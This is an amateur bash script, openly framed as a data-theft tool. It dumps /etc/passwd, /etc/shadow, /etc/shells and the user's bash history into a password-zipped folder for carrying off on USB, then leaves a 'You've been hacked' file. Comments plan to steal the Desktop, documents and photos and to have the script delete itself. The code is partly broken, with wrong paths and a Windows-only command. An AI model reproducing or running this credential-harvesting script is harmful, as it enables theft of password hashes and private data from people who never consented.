
#DEBUG THIS CODE!!!!!
options="Overwritable"

echo "POOLING DATA NOW!!!!    ^__^  *&*"
sleep 0.5

echo "User Id..."
sleep 1
id

echo "Who the user is..."
sleep 1
who 

sleep 2

#The code needs to make these files, write to them
#secure tehm, and then remove them afterwards
cd 
cd /
cd etc
ls -la > USRetcBIN.txt
cat passwd > UserPss.txt
cat shadow > UserShadow.txt
cat shells > UserShells.txt

#Next make a new directory
mkdir DataPool
mv USRetcBIN.txt DataPool
mv UserPss.txt DataPool
mv UserShadow.txt DataPool
mv UserShells.txt DataPool

mv DataPool Desktop

cd 
cat .bash_history > BashHistory.txt
mv BashHistory.txt Desktop
cd Desktop
mv BashHistory.txt DataPool

#Next steal data from other places important and the mv them to the datapool directory

echo POOLING COMPLETE.... BEGINNING ENCRYPTION PROCESS NOW....
sleep 2

zip -e -r DataPool DataPool

echo "PING PONG ^__^ DONE ENCRYPTING!!!!"

#The data can be sent to either: USB medium or email, or both simutaneously
#How the USB section will work:
	#locate where the directory is for the usb ports to find the medium
	#cd the directory to that location
	#once found, mv the directory to the desired device by promptig the user to type a command via another terminal

echo "Doing stuff ^^___^^^....."
sleep 0.5

read -p "Preparing USB transfer. Please insert USB and open a new terminal. Hit enter in this terminal when done"
echo "OK!!!!"

	sleep 0.5
	
	#This command will pull up all USB ports when the user is ready
	echo "Mv the directory to the designated folder using the terminal, aside from this terminal" 
	
	lsusb
	
	echo "Cmd is -> mv DataPool (enter your port location here)"
	echo "EX mv DataPool /dev/bus/000-899"
	
	read -p "Are you done? Hit enter if no, else ctrl+c and re-run. If this code is set to auto run from USB then just unmount and remount"
	
	#ADVANCED VERSION OF THE CODE LEAR HOW REMOVE FILES WHILE THEY RUN
	#When the program is set and done, the code itself will be ejected/removed from the users PC

	echo "^__^"
	sleep 2
	cd 
	
	hacked="BYE BYE >:3 You've been hacked!!!!"
	touch Hacked.txt
	echo $hacked > Hacked.txt
	start Hacked.txt
	
	

#ADVANCED EDITS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


#ADVANCED VERSION OF THE CODE LEAR HOW REMOVE FILES WHILE THEY RUN
	#When the program is set and done, the code itself will be ejected/removed from the users PC
	
	
#ADVANCED COPY OF THE CODE WILL SERVE TO SEND ALL USER INFO TO THE VOID

#Stealing User's entire Desktop Directory


#Stealing all the users documents

#Stealing all the user's photos

#Stealing all the user's








